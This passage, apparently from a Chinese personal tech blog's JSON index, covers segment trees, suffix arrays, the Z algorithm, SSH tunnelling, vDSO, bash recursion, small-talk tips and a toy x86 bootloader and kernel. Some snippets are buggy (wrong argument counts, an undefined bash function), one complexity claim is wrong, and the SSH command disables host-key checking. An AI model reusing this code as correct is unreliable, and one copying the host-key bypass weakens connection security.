query(root.left, i, j)    elif i &gt; root.mid:        return query(root.right, i ,j)    else:        return query(root.left, i, root.mid)+query(root.right, root.mid, j)def update(root,i,j,val):    if root.i == i and root.j == j:        root.newVal, root.changed = val, True    else:        root.push()        if i &lt; root.mid:            update(root.left, i, val)        else:            update(root.right, i, val)\n持久化\n保留過去的版本\n在update時把經過的node都重生一遍!!\ndef update(root,i,val):    if root.i == i and root.j-root.i == 1:        return Node(root.i, root.j, val)    else:        ret = Node(root.i, root.j, &#x27;waiting&#x27;)        if i &lt; root.mid:            ret.right, ret.left = update(root.right, i, val), root.left        else:            ret.left, ret.right = update(root.left, i, val), root.right        ret.val = ret.left.val + ret.right.val        return ret\nsegment tree 與 binary index tree的差異\n\n\n\n\nsegment tree\nbinary index tree\n\n\n\n\nLoC\n多\n少\n\n\nquery range\na~b\n1~n\n\n\ntime complexity of building\nO(lg(n))\nO(N)\n\n\ntime complexity of query\nO(lg(n))\nO(lg(n))\n\n\ntime complexity of update\nO(lg(n))\nO(lg(n))\n\n\n\nRef\nSegment Tree\n","categories":["Algorithm","Classic"]},{"title":"幫ssh debug","url":"/2021/11/ssh-debug/","content":"動機\n建ssh tunnel遇到的坑\n\nHost key verification error\nssh -vvv\n用vvv看才發現是開不了/dev/tty，但是最後的err msg卻只報 Host key verification error!!\n有夠誤導\n與之對比: docker cli\ndocker cli就是他媽的黑盒子\n所以到底發了什麼http request\n透過jump host開ssh tunnel\nssh -o ControlPath=/tmp/temp_ssh_tunnel -o ProxyCommand=&quot;ssh -W %h:%p -o StrictHostKeyChecking=no $&#123;SSH_BASHION_HOST&#125;&quot; -o StrictHostKeyChecking=no -f -N -M -L 6000:127.0.0.1:5000 $&#123;SSH_REGISTRY_HOST&#125;ssh -o ControlPath=/tmp/temp_ssh_tunnel -O exit -o ProxyCommand=&quot;ssh -W %h:%p -o StrictHostKeyChecking=no $&#123;SSH_BASHION_HOST&#125;&quot; $&#123;SSH_REGISTRY_HOST&#125;","categories":["Utils","SSH"]},{"title":"suffix array","url":"/2021/11/suffix-array/","content":"動機\n記錄用\nTODO: 這能幹嘛\n\n定義\n就是一個array是map一個排名到以該數字開始的suffix\n排名就是把suffix sort過的順序\n像是[2,3,0,4,1]就是\n\n以2開始的suffix是第一名\n以3開始的suffix是第二名\n\n流程\nconcept(用到分塊與倍增):\n\ncounting sort\n分class\n\ninit:\n\n做counting sort (對每個字做)\n分class (sort過，所以只要前後字不一樣就是不同classes)\n\n2, 4, 8 …:\n\n先取前半string的位置\n以前半的class做counting sort\n分class (前半要在同一個class，後半也要在同一個class)\n\ndef count_sort(arr, kinds, f):  ret = [0]*len(arr)  cnts = [0]*kinds  for n in arr:    cnts[n] += 1  for i in range(1,kinds):    cnts[i] += cnts[i-1]  for i in reversed(range(len(arr))): # reversed!!    cnts[arr[i]] -= 1    ret[cnts[arr[i]]] = f[i]  return retdef classify(arr, p, isDiffLevel):  l = [0]*len(arr)  level = 0  for i in range(1,len(arr)):    if isDiffLevel(i,i-1):      level += 1    l[p[i]] = level  return l, level+1s = [0,0,1,0]p = count_sort(s, len(s), list(range(len(s))))l, levels = classify(s, p, lambda a,b: s[p[a]] != s[p[b]])for h in filter(lambda h: (1 &lt;&lt; h) &lt; len(s), range(len(s))):  def isDiff(a,b):    rhs = (l[p[a]], l[(l[a]+(1&lt;&lt;h))% len(s)] )    lhs = (l[p[b]], l[(l[b]+(1&lt;&lt;h))% len(s)] )    return rhs != lhs  p_lhs = [p[i] - (1 &lt;&lt; h) + (len(s) if p[i] &lt; (1 &lt;&lt; h) else 0) for i in range(len(s))]  p = count_sort([l[x] for x in p_lhs], levels, p_lhs)  l, levels = classify(s, p, isDiff)print(p)\nRef\nSuffix Array\n","categories":["Algorithm","Classic"]},{"title":"syscall與vdso","url":"/2021/11/syscall-vdso/","content":"動機\n記錄用\n\nsyscall一般版\ninterrupt 0x80\nvsyscall\n後面cpu有了專門打syscall的指令，但是32/64的指令居然不同!!\n32: sysenter, sysexit\n64: syscall, sysret\n但如果在runtime每次判斷要用那種其實很智障\n所以，加一層vsyscall，讓kernel在開機時根據cpu載入對的vsyscall的程式(binary)\n並在kernel space留下一段固定位置給userspace獨與執行\n而這段位置怎麼讓userspace知道?\nELF的auxiliary vector 的 AT_SYSINFO\nvdso(virtual dynamic shared object)\nvsyscall有兩個讓人怕的地方\n\nbinary，不好debug(symbol table在哪)\n這是固定位置，怕\n\n所以後面有了vDSO，把這段程式變成ELF，就可以動態載入與load DWARF\nELF複製到page，透過auxiliary vector 的 AT_SYSINFO_EHDR給addr\n現在要用的話自然都是包在glibc\n__kernel_vsyscall\n_dl_vdso_vsym\n同時有了vsyscall與vDSO就可以加速syscall，因為不用轉到kernel space(提權)\nRef\nvDSO: 快速的 Linux 系統呼叫機制\nhttps://alittleresearcher.blogspot.com/2017/04/linux-vdso-and-vsyscall-history.html\nThe Definitive Guide to Linux System Calls\n","categories":["System","Linux","FAQ"]},{"title":"Z Algorithm","url":"/2021/11/z-algo/","content":"動機\n\nZ algo\nz[i]是看這個位置i開始，與從0開始的string，有多長是一樣的\n所以可以把pattern接到要比對的字串最前面，之後產生z function，去找與pattern一樣長的位置\n那重點就是怎麼產生z function?\nz function是從i開始往前看，所以可以利用前面已經看過的z[i]來加速\n假設有一個已經生完z[i]的範圍(最靠右)\n\n看i是不是在範圍中，同時看利用之前的z[i-l]延伸出去，如果還在範圍，就抄答案\n不能抄答案就重新算\n\ndef mk_z(S):\tz = [0]*len(S)\tl, r = 0, 1\tdef extend(l, r):\t\twhile r &lt;= len(S) and S[r-l-1] == S[r-1]:\t\t\tr += 1\t\treturn r\t# [l,r)\t# most examples use [i,r], which is closed range\t# I dont like closed range, so I use [l,r) to rewrite this prog\tfor i in range(1,len(S)):\t\t# ((l) ... i) ..z[i-l].. r\t\tif i &lt; r and i+z[i-l] &lt; r-1: # i+z[i-l] is extended str, and this is in range\t\t\tz[i] = z[i-l] # so we can compute z[i] directly\t\telse: # i is not in [l,r) or i+z[i-l] &gt;= r-1, so we need a new [l,r)\t\t\tl = i # new range\t\t\tr = extend(l, i+1 if i &gt;= r else r) # use new end &amp; extend\t\t\tz[i] = r-l-1 # new [l,r), new z[i] (compute)\treturn zdef z_algo(S,pat):\tmagic = f&#x27;&#123;pat&#125;.&#123;S&#125;&#x27; # &#x27;.&#x27; must not exist in S &amp; pat\tz = mk_z(magic)\toffset = len(pat)+1\tfor i in range(offset, len(magic)):\t\tif z[i] == len(pat):\t\t\treturn f&#x27;found at &#123;i-offset&#125;&#x27;\treturn &#x27;no found&#x27;","categories":["Algorithm","Classic"]},{"title":"在bash中寫rucursive","url":"/2022/01/bash-rucursive-function/","content":"動機\nbash可以寫rucursive!!\n\ncode\n下面除了遞迴外，還有用到bash function不用寫args list的特性，去塞acc\ncharset=&quot;0 1&quot;;ret=&quot;&quot;function perm() &#123;        [ &quot;$1&quot; = &quot;0&quot; ] &amp;&amp; &#123; f $2; return; &#125;        for char in $charset        do                perm &quot;$(($&#123;1&#125; - 1 ))&quot; &quot;$char $2&quot;        done&#125;perm 4","categories":["Utils","Bash"]},{"title":"最高閒聊法","url":"/2022/01/chatting/","content":"動機\n書越來越貴了\n\n\n\n閒聊目的: 建立人際關係\n\n透過對話，卸下彼此的心防，讓雙方關係變得更緊密\n\n不需要\n\n硬講一些有趣的事\n結論、結局\n\n資訊交流是難以拉近彼此距離的閒聊\n\n\n\n\n沒有終點反而更好\n\n重點不是內容\n\n傳遞心情、感受\n\n很順手、適合自己、麻煩的地方、有趣之處、玩上癮、我懂\n有夠嚇人、整個變得不一樣\n\n\n\n\n而是你來我往的【持久性】\n\n持續不中斷 &lt;=&gt; 閒聊\n\n\n\n\n對話是雙向的\n\n\n\n\n\n如何開啟話題\n\n用流行話題或是新聞開頭\n\n對話會變得很表面、膚淺\n\n很難聊到彼此感受\n\n\n\n\n聊與自己有關的事件經驗\n\n使用狀聲詞或語助詞，有助於表達自己的真實感受\n\n經驗+感受 =&gt; 快速拉近你與對方的距離\n\n\n\n\n\n\n\n如何傾聽\n\n【不要求對話要有結論或是結果】\n\n不要提供建議\n\n\n讓對話持續不中斷\n\n不糾正對方的錯誤\n\n\n讓對方表達自己的心情\n\n肯定同理對方就好\n\n\n有效果的反應\n\n傾聽，只要有所反應就好\n\n用身體語言、表情傳遞心情\n\n拍手、微笑、換表情\n\n\n\n\n\n\n\n\n\n沉默怎麼處理\n\n先放緩步調，不用怕沉默\n利用前面的原則，聊自己的事、貼近自己的事，聊心情\n\n\n\n結束閒聊的方法\n\n做出與前面的原則相反的行為\n\n盡量不聊心情、想法\n減少反應\n做出結論\n\n\n最後道謝，離開\n\n\n\n開始閒聊\n\n從打招呼開始\n\n你好、午安等\n\n\n打招呼後報上自己的名字\n\n不論第幾次見面\n\n這樣對方也會報名字，可以確認對方的姓名\n\n\n\n\n知道、問了名字之後\n\n問名字的由來\n不要聊同名的朋友!!\n\n\n詢問興趣的方式\n\n【你最近有迷上什麼嗎?】\n\n問題具體\n不用擔心對興趣的定義差異\n\n\n如果被問了，你有什麼興趣怎麼辦\n\n不用回答真正的興趣\n\n說\n\n最近迷上的事\n周末做了什麼\n這禮拜的行程\n\n\n閒聊時不用正面回答別人的問題\n\n\n\n\n\n\n聊共同朋友?\n\n最好不要\n\n很難聊到彼此的事\n\n\n要把話題帶回彼此身上\n\n找對話中的keyword\n\n\n\n\n挑話題\n\n有沒有共同點(共同話題)一點也不重要\n\n不是只有共同興趣能聊\n\n\n就算是不熟的topic，也有機會\n\n問對方的\n\n過去\n\n【從以前就很喜歡嗎】、【從什麼時候開始學的】\n很好作為開頭問題\n\n\n現在\n\n【現在也很常做嗎】、【最近有什麼推薦的】\n縮短彼此的心理距離\n\n\n未來\n\n【這個周末也是嗎】、【下次有想參加的活動嗎】\n可以銜接到下一個話題\n\n\n\n\n\n\n有共同話題\n\n用 問對方的 過去、現在、未來，讓對方先講\n\n我也是 + 然後呢?然後呢?\n\n\n\n\n\n\n說到喜歡的事時 (我喜歡…, 我試了…)\n\n閒聊時應該說 沒有理由的喜好 而非 主張強烈的意見\n\n提問、贊同、自我揭露\n\n\n飲食喜好是不錯的話題\n遇到喜歡爭論的人\n\n表示感謝馬上離開\n\n\n\n\n自我揭露\n\n不能只讓別人說!!\n稍微講講自己，之後馬上把話題轉回去\n\n【我常常這樣…，你會嗎?】\n【我最近覺得…，你覺得?】\n\n\n\n\n對方停不下來\n\n冷卻話題\n\n正面回顧前面的對話\n\n【你說的東西很有趣時間過得好快啊】\n【講得好多，聊得真是開心】\n\n\n看對面要不要把球丟回來 或 直接道謝之後離開\n\n\n\n\n肢體動作\n\n不要雙手抱胸\n邊說邊做誇張的手勢\n想要眼神交會 =&gt; 看對方的嘴角說話\n想要離開可以做與上面相反的動作\n\n\n應聲附和\n\n應聲附和比讚美追捧簡單\n\n複述關鍵字\n附和、點頭 (不要怕沉默，只要有在那個ctx下讓雙方都可以閒聊就ok)\n\n再極端點，可以說【我可以做筆記嗎】\n\n\n\n\n利用 對阿、不錯ㄟ、恩恩、咦、喔喔 等語助詞和感嘆句\n\n\n麻煩的話題 (說教、尷尬…)\n\n不要反駁\n把球丟給別人\n\n【XXX，你覺得如何】\n\n可以把路人拉入對話\n\n增加夥伴，避免最糟的狀況\n\n\n\n\n\n\n用【謝謝】強制結束對話\n\n\n閒聊不需要開朗活潑，而是技巧\n\n一切就是習慣就好，要順著開口\n\n順著上一句、環境、ctx，開始問\n\n\n\n\n別人找你商量煩惱\n\n不要給意見!!\n\n不燃馬上就結束了\n反正他也只是想抒發\n\n\n展現同理(贊同)\n\n\n這個話題也許很無聊、沒有好的結論\n\n只要先和對方提\n\n【我想說的一點結論都沒有，ok嗎】\n【很芝麻小事的話題】\n\n不會給對方過度期待\n\n\n\n\n\n\n讓閒聊有畫面\n\n避免指示代名詞\n上名字、代號\n\n重點是好懂: 具體、有畫面\n\n\n\n\n容易回答的問題\n\n【你做了什麼特別的事】\n\n詢問對方熱中的事物、講究之處\n\n用 過去/現在/未來 問/回答 興趣\n用 習慣 問/回答 堅持\n\n\n\n\n如何(how)? 詢問心情\n\n不要問為什麼，讓人思考情緒就會冷靜下來\n例:不小心睡過頭了\n\n【一次也沒有醒嗎】\n【你醒來時是不是嚇到了】\n\n\n\n\n\n\n說話方式\n\n描述氣氛\n\n不能含糊回答的不能當成閒聊的話題\n\n如果涉及判斷，就回答好的(含糊回答)\n\n不論是不是好的\n\n\n\n\n順應ctx感受氣氛\n\n如果聽到不懂得名詞，就附和就好\n\n重點是分享/感受當時的心情\n\n\n\n\n\n\n讚美、附和\n\n不要吐槽，一旦尷尬就完了\n例子\n\n好酷\n不錯ㄟ\n好美\n…\n\n\n\n\n提具體問題\n\n問對方好回答的問題!!\n\n提具體問題\n\n你最近好嗎 =&gt; 工作順利嗎\n\n\n抽象 + 具體\n\n你最近好嗎 + 你現在公司是在丸之內嗎\n你周末做了什麼 + 例如上個周末\n好久不見，最近好嗎 + 身體都還好嗎\n\n\n\n\n\n\n面對讚美\n\n接受，並道謝，之後加一句擴展話題\n\n謝謝 + 我每天晚上都擦超級保濕的乳霜\n\n\n\n\n如何讚美\n\n點出變化 + 讚美\n\n你是不是換髮型了 + 很適合你ㄟ\n\n\n\n\n話題延伸不下去了\n\n回到前面的話題、重複的話題也ok\n聊自己的經驗\n\n只要還在閒聊的ctx，不管什麼話題都可以拋\n\n\n\n\n【這個我之前是不是講過了】\n\n【你可以再說一次】、【我忘了，你再說一次】\n\n\n不要用模糊的記憶介紹他人\n\n【我記得是負責XXX?】\n\n直接把這件事轉給被介紹的人\n\n\n\n\n被問到隱私問題時\n\n面對難以回答的問題時\n\n用一般論含糊帶過\n\n\n想與對方拉近距離\n\n老實回答\n\n\n\n\n\n\n商場上的說法方式\n\n如同師徒的請益對話\n\n只要有微妙的上下關係都適用\n\n\n\n\n切入話題的方法\n\n不一定要知道的多，或是十分深入\n要有自己的切入點\n\n\n想切入正題\n\n直接講明，【我們換個話題…】\n只要不追求順其自然，閒聊其實超簡單\n\n\n別碰熟人的八卦\n\n名人或是不認識的就算了\n\n\n表達感謝\n\n除了感謝外，還可以加上關心(善意)\n\n謝謝今天陪我\n\n回程路上冷不冷\n電車上好像很擠，順利到家了嗎\n\n\n\n\n\n\n\n\n\n","categories":["Reading"]},{"title":"電腦從0開始","url":"/2022/01/craft-small-os/","content":"動機\n這篇主要在看怎麼從最一開始到一個可以打字的kernel的過程\n重點不是裡面的code，而是過程\n因為真正讓人痛苦的東西其實是在os提供的各種抽象設施，也是progammer要在意的點\n\n開始之前\n可以直接看下面的說明，如果想跑跑看可以照下面的步驟\n\n裝docker(不想重編toolchain), nasm, build-essential, gdb, qemu-x86\nclone 這個\ncheckout到想看的commit去跑\n\n從硬碟出發: bootloader\nbootloader\nboot sector是bios第一個讀的sector，sector大小是512 bytes\nbootloader會放在這裡\nbootloaer的程式會被bios放在mem的0x7c00\nbios會去找aa55，以這個為終點\n所以bootloader的咒語是\n[org 0x7c00] ; 在做c的星號時直接加0x7c00; command ...; $ :: 現在位置; $$ :: 前一個指令的位置times 510-($-$$) db 0 dw 0xaa55\naa55佔2 bytes，之後就是用0填滿\n$是現在的位置，$$是前一個指令的位置\nia32 programming\nassembler: 讀code，算位置，噴binary(或是elf)\nbyte, word, double word(dword)\nbyte: 8bits\nword: 2bytes\ndword: 4bytes\n之後要用ia32去生\nbyte: db\nword: dw\ndword: dd\nnasm的output長什麼樣子\ndb 0x0db 0xb5dw 0x0dw 0xc5dd 0x0dw 0xd5\noutput\n00000000: 00b5 0000 c500 0000 0000 d500            ............\ndb 0xb5db 0x0dw 0xc5db 0x0dd 0xd5db 0x0\noutput\n00000000: b500 c500 00d5 0000 0000                 ..........\nbyte: 兩格\nword: 四格\ndword: 八格\n一格大小是0.5byte (hex, 4bits)\nmode\n16bits real mode\n\n定址範圍是1MB\n可以用bios的handler去操作裝置\n只要知道mem的addr就可以改\n\n32bits protected mode\n\n定址範圍是4GB\n沒有bios的handler可以用…\n\n所以要自己寫driver\n\n\n有GDT可以控制權限\n\nmemory address\n16bits real mode: segmentation\nPhysical Address = Segment * 16 + Offset\n就是左移1格\nds是data segmentation的base reg\nmov ah, 0x0e ; ttymov bx, 0x7c0 ; 移1格mov ds, bx; WARNING: from now on all memory references will be offset by &#x27;ds&#x27; implicitlymov al, [the_secret]int 0x10mov al, [es:the_secret]int 0x10 ; doesn&#x27;t look right... isn&#x27;t &#x27;es&#x27; currently 0x000?mov bx, 0x7c0mov es, bxmov al, [es:the_secret]int 0x10jmp $the_secret:    db &quot;X&quot;times 510 - ($-$$) db 0dw 0xaa55\n32bits protected mode: GDT\nGDT就是區分mem的表，除了標長度、起點還可以設定權限(ring1~3就是這裡來的)\nGDT最少要有兩個segment，包含start!!\n但設定的樣子十分反人類\ngdt_start: ; don&#x27;t remove the labels, they&#x27;re needed to compute sizes and jumps    ; the GDT starts with a null 8-byte    dd 0x0 ; 4 byte    dd 0x0 ; 4 byte; GDT for code segment. base = 0x00000000, length = 0xfffff; for flags, refer to os-dev.pdf document, page 36gdt_code:     dw 0xffff    ; segment length, bits 0-15    dw 0x0       ; segment base, bits 0-15    db 0x0       ; segment base, bits 16-23    db 10011010b ; flags (8 bits)    db 11001111b ; flags (4 bits) + segment length, bits 16-19    db 0x0       ; segment base, bits 24-31; GDT for data segment. base and length identical to code segment; some flags changed, again, refer to os-dev.pdfgdt_data:    dw 0xffff    dw 0x0    db 0x0    db 10010010b    db 11001111b    db 0x0gdt_end:; GDT descriptorgdt_descriptor:    dw gdt_end - gdt_start - 1 ; size (16 bit), always one less of its true size    dd gdt_start ; address (32 bit); define some constants for later useCODE_SEG equ gdt_code - gdt_startDATA_SEG equ gdt_data - gdt_start\n詳細的flag可以看這裡\n之後就可以load他\nlgdt [gdt_descriptor]\nbootloader的工作\n載入kernel\nQ: 為什麼不在32bits保護模式載入kernel?\nA: 現在還可以讓bios幫我們load，只要打中斷就好\nINT 13,2 - Read Disk Sectors\nKERNEL_OFFSET equ 0x1000disk_load:    pusha    ; reading from disk requires setting specific values in all registers    ; so we will overwrite our input parameters from &#x27;dx&#x27;. Let&#x27;s save it    ; to the stack for later use.    push dx    mov ah, 0x02 ; ah &lt;- int 0x13 function. 0x02 = &#x27;read&#x27;    mov al, dh   ; al &lt;- number of sectors to read (0x01 .. 0x80)    mov cl, 0x02 ; cl &lt;- sector (0x01 .. 0x11)                 ; 0x01 is our boot sector, 0x02 is the first &#x27;available&#x27; sector    mov ch, 0x00 ; ch &lt;- cylinder (0x0 .. 0x3FF, upper 2 bits in &#x27;cl&#x27;)    ; dl &lt;- drive number. Our caller sets it as a parameter and gets it from BIOS    ; (0 = floppy, 1 = floppy2, 0x80 = hdd, 0x81 = hdd2)    mov dh, 0x00 ; dh &lt;- head number (0x0 .. 0xF)    ; [es:bx] &lt;- pointer to buffer where the data will be stored    ; caller sets it up for us, and it is actually the standard location for int 13h    int 0x13      ; BIOS interrupt    jc disk_error ; if error (stored in the carry bit)    pop dx    cmp al, dh    ; BIOS also sets &#x27;al&#x27; to the # of sectors read. Compare it.    jne sectors_error    popa    retdisk_error:    mov bx, DISK_ERROR    call print_16    call print_nl_16    jmp disk_loopsectors_error:    mov bx, SECTORS_ERROR    call print_16disk_loop:    jmp $DISK_ERROR: db &quot;Disk read error&quot;, 0SECTORS_ERROR: db &quot;Incorrect number of sectors read&quot;, 0 [bits 16]load_kernel:    mov bx, MSG_LOAD_KERNEL    call print_16    call print_nl_16    mov bx, KERNEL_OFFSET ; Read from disk and store in 0x1000    mov dh, 2    mov dl, [BOOT_DRIVE]    call disk_load    ret[bits 32]start_kernel:    call KERNEL_OFFSET    jmp $MSG_LOAD_KERNEL db &quot;Loading kernel into memory&quot;, 0 \n切32bit保護模式\n載入kernel後，就是切保護模式與設定pagetable\n剩下就可以寫c了\n[bits 16]switch_to_pm:    cli ; 1. disable interrupts    lgdt [gdt_descriptor]    mov eax, cr0    or eax, 0x1 ; 3. set 32-bit mode bit in cr0    mov cr0, eax    jmp CODE_SEG:init_pm ; 4. far jump by using a different segment[bits 32]init_pm: ; we are now using 32-bit instructions    mov ax, DATA_SEG ; 5. update the segment registers    mov ds, ax    mov ss, ax    mov es, ax    mov fs, ax    mov gs, ax    mov ebp, 0x90000 ; 6. update the stack right at the top of the free space    mov esp, ebp    call BEGIN_PM ; 7. Call a well-known label with useful code[bits 32]BEGIN_PM: ; after the switch we will get here    mov ebx, MSG_PROT_MODE    call print_32 ; Note that this will be written at the top left corner    call start_kernel    jmp $BOOT_DRIVE db 0 ; It is a good idea to store it in memory because &#x27;dl&#x27; may get overwrittenMSG_REAL_MODE db &quot;Started in 16-bit real mode&quot;, 0MSG_PROT_MODE db &quot;Loaded 32-bit protected mode&quot;, 0\n怎麼把bootloader與kernel合在一起?\n兩個都是binary，直接接起來\n接起來的就是一個硬碟\ncat boot.bin kernel.bin &gt; os-image.bin\n因為沒有要控制資料擺放位子(memory layout)，所以這裡就直接接起來\n但之後看xv6會看到linker的部分，去調整kernel裡面怎麼放東西\n在記憶體了: kernel\nkernel如何操作裝置?\n操作裝置的方式有兩種\n\n透過port\n透過mapped的memory\n\nvideo driver\n透過port去讀cursor的訊息\n先port in需要什麼參數，之後port out去讀\nunsigned char port_byte_in (unsigned short port) &#123;    unsigned char result;    /* Inline assembler syntax     * !! Notice how the source and destination registers are switched from NASM !!     *     * &#x27;&quot;=a&quot; (result)&#x27;; set &#x27;=&#x27; the C variable &#x27;(result)&#x27; to the value of register e&#x27;a&#x27;x     * &#x27;&quot;d&quot; (port)&#x27;: map the C variable &#x27;(port)&#x27; into e&#x27;d&#x27;x register     *     * Inputs and outputs are separated by colons     */    __asm__(&quot;in %%dx, %%al&quot; : &quot;=a&quot; (result) : &quot;d&quot; (port));    return result;&#125;void port_byte_out (unsigned short port, unsigned char data) &#123;    /* Notice how here both registers are mapped to C variables and     * nothing is returned, thus, no equals &#x27;=&#x27; in the asm syntax      * However we see a comma since there are two variables in the input area     * and none in the &#x27;return&#x27; area     */    __asm__(&quot;out %%al, %%dx&quot; : : &quot;a&quot; (data), &quot;d&quot; (port));&#125;unsigned short port_word_in (unsigned short port) &#123;    unsigned short result;    __asm__(&quot;in %%dx, %%ax&quot; : &quot;=a&quot; (result) : &quot;d&quot; (port));    return result;&#125;void port_word_out (unsigned short port, unsigned short data) &#123;    __asm__(&quot;out %%ax, %%dx&quot; : : &quot;a&quot; (data), &quot;d&quot; (port));&#125;int get_cursor_offset() &#123;    /* Use the VGA ports to get the current cursor position     * 1. Ask for high byte of the cursor offset (data 14)     * 2. Ask for low byte (data 15)     */    port_byte_out(REG_SCREEN_CTRL, 14);    int offset = port_byte_in(REG_SCREEN_DATA) &lt;&lt; 8; /* High byte: &lt;&lt; 8 */    port_byte_out(REG_SCREEN_CTRL, 15);    offset += port_byte_in(REG_SCREEN_DATA);    return offset * 2; /* Position * size of character cell */&#125;\n透過video memory去印文字\nvideo memory是一格pixel對到兩個記憶體\n第一個是文字\n第二個是顏色\nint print_char(char c, int col, int row, char attr) &#123;    unsigned char *vidmem = (unsigned char*) VIDEO_ADDRESS;    if (!attr) attr = WHITE_ON_BLACK;    /* Error control: print a red &#x27;E&#x27; if the coords aren&#x27;t right */    if (col &gt;= MAX_COLS || row &gt;= MAX_ROWS) &#123;        vidmem[2*(MAX_COLS)*(MAX_ROWS)-2] = &#x27;E&#x27;; // HERE        vidmem[2*(MAX_COLS)*(MAX_ROWS)-1] = RED_ON_WHITE; // HERE        return get_offset(col, row);    &#125;    int offset;    if (col &gt;= 0 &amp;&amp; row &gt;= 0) offset = get_offset(col, row);    else offset = get_cursor_offset();    if (c == &#x27;\\n&#x27;) &#123;        row = get_offset_row(offset);        offset = get_offset(0, row+1);    &#125; else &#123;        vidmem[offset] = c; // HERE        vidmem[offset+1] = attr; // HERE        offset += 2;    &#125;    set_cursor_offset(offset);    return offset;&#125;\nkernel如何與cpu互動?\n\nkernel -&gt; cpu: 指令\ncpu &lt;-&gt; kernel: 中斷\n\n中斷有分\n\n例外\n裝置\n\n但兩個其實差不多\n例外\n\n宣告表(callback)\n\nglobal isr0global isr1global isr2isr0:    cli    push byte 0    push byte 0    jmp isr_common_stub; 1: Debug Exceptionisr1:    cli    push byte 0    push byte 1    jmp isr_common_stub; 2: Non Maskable Interrupt Exceptionisr2:    cli    push byte 0    push byte 2    jmp isr_common_stub\n\n設定handler\n\n也就是做ctx switch(把register存下來，之後寫回去)，之後call handler\nQ: register存在哪?\nA: 目前的stack上 (之後xv6會是在自己的process上)\nisr_common_stub:    ; 1. Save CPU state\tpusha ; Pushes edi,esi,ebp,esp,ebx,edx,ecx,eax\tmov ax, ds ; Lower 16-bits of eax = ds.\tpush eax ; save the data segment descriptor\tmov ax, 0x10  ; kernel data segment descriptor\tmov ds, ax\tmov es, ax\tmov fs, ax\tmov gs, ax\t    ; 2. Call C handler\tcall isr_handler\t    ; 3. Restore state\tpop eax \tmov ds, ax\tmov es, ax\tmov fs, ax\tmov gs, ax\tpopa\tadd esp, 8 ; Cleans up the pushed error code and pushed ISR number\tsti\tiret ; pops 5 things at once: CS, EIP, EFLAGS, SS, and ESP\n\n轉到function\n\nvoid isr_handler(registers_t r) &#123;    kprint(&quot;received interrupt: &quot;);    char s[3];    int_to_ascii(r.int_no, s);    kprint(s);    kprint(&quot;\\n&quot;);    kprint(exception_messages[r.int_no]);    kprint(&quot;\\n&quot;);&#125;\n裝置\n裝置的irq其實差不多 (所以xv6是兩個一起處理的)\n這裡看個鍵盤的例子，鍵盤就是透過port讀打了什麼之後轉成char，印出來\n#define BACKSPACE 0x0E#define ENTER 0x1Cstatic char key_buffer[256];#define SC_MAX 57const char *sc_name[] = &#123; &quot;ERROR&quot;, &quot;Esc&quot;, &quot;1&quot;, &quot;2&quot;, &quot;3&quot;, &quot;4&quot;, &quot;5&quot;, &quot;6&quot;,     &quot;7&quot;, &quot;8&quot;, &quot;9&quot;, &quot;0&quot;, &quot;-&quot;, &quot;=&quot;, &quot;Backspace&quot;, &quot;Tab&quot;, &quot;Q&quot;, &quot;W&quot;, &quot;E&quot;,         &quot;R&quot;, &quot;T&quot;, &quot;Y&quot;, &quot;U&quot;, &quot;I&quot;, &quot;O&quot;, &quot;P&quot;, &quot;[&quot;, &quot;]&quot;, &quot;Enter&quot;, &quot;Lctrl&quot;,         &quot;A&quot;, &quot;S&quot;, &quot;D&quot;, &quot;F&quot;, &quot;G&quot;, &quot;H&quot;, &quot;J&quot;, &quot;K&quot;, &quot;L&quot;, &quot;;&quot;, &quot;&#x27;&quot;, &quot;`&quot;,         &quot;LShift&quot;, &quot;\\\\&quot;, &quot;Z&quot;, &quot;X&quot;, &quot;C&quot;, &quot;V&quot;, &quot;B&quot;, &quot;N&quot;, &quot;M&quot;, &quot;,&quot;, &quot;.&quot;,         &quot;/&quot;, &quot;RShift&quot;, &quot;Keypad *&quot;, &quot;LAlt&quot;, &quot;Spacebar&quot;&#125;;const char sc_ascii[] = &#123; &#x27;?&#x27;, &#x27;?&#x27;, &#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;, &#x27;5&#x27;, &#x27;6&#x27;,         &#x27;7&#x27;, &#x27;8&#x27;, &#x27;9&#x27;, &#x27;0&#x27;, &#x27;-&#x27;, &#x27;=&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;Q&#x27;, &#x27;W&#x27;, &#x27;E&#x27;, &#x27;R&#x27;, &#x27;T&#x27;, &#x27;Y&#x27;,         &#x27;U&#x27;, &#x27;I&#x27;, &#x27;O&#x27;, &#x27;P&#x27;, &#x27;[&#x27;, &#x27;]&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;A&#x27;, &#x27;S&#x27;, &#x27;D&#x27;, &#x27;F&#x27;, &#x27;G&#x27;,         &#x27;H&#x27;, &#x27;J&#x27;, &#x27;K&#x27;, &#x27;L&#x27;, &#x27;;&#x27;, &#x27;\\&#x27;&#x27;, &#x27;`&#x27;, &#x27;?&#x27;, &#x27;\\\\&#x27;, &#x27;Z&#x27;, &#x27;X&#x27;, &#x27;C&#x27;, &#x27;V&#x27;,         &#x27;B&#x27;, &#x27;N&#x27;, &#x27;M&#x27;, &#x27;,&#x27;, &#x27;.&#x27;, &#x27;/&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27; &#x27;&#125;;static void keyboard_callback(registers_t regs) &#123;    /* The PIC leaves us the scancode in port 0x60 */    uint8_t scancode = port_byte_in(0x60);    if (scancode &gt; SC_MAX) return;    if (scancode == BACKSPACE) &#123;        backspace(key_buffer);        kprint_backspace();    &#125; else if (scancode == ENTER) &#123;        kprint(&quot;\\n&quot;);        user_input(key_buffer); /* kernel-controlled function */        key_buffer[0] = &#x27;\\0&#x27;;    &#125; else &#123;        char letter = sc_ascii[(int)scancode];        /* Remember that kprint only accepts char[] */        char str[2] = &#123;letter, &#x27;\\0&#x27;&#125;;        append(key_buffer, letter);        kprint(str);    &#125;    UNUSED(regs);&#125;void init_keyboard() &#123;   register_interrupt_handler(IRQ1, keyboard_callback); &#125;\n之後哩\n到此已經可以\n\n開機\n打字\nprint\n\n可以當成整台電腦只有我們這一個process，就是整台電腦\n(所以可以反過來看，只要有process就是有了一台電腦的幻覺)\n但如果要讓多個process一起用時?\n或是應該問，我們還缺什麼?\n\nprocess\n\nmem management\nconcurrent\n\n\nuser/kernel mode\nfilesystem\n\n之後到xv6一邊看實作，一邊做lab\nRef\nos-tutorial\nOverview of IA-32 assembly programming\nWhich variable size to use (db, dw, dd) with x86 assembly?\nx86 Assembly 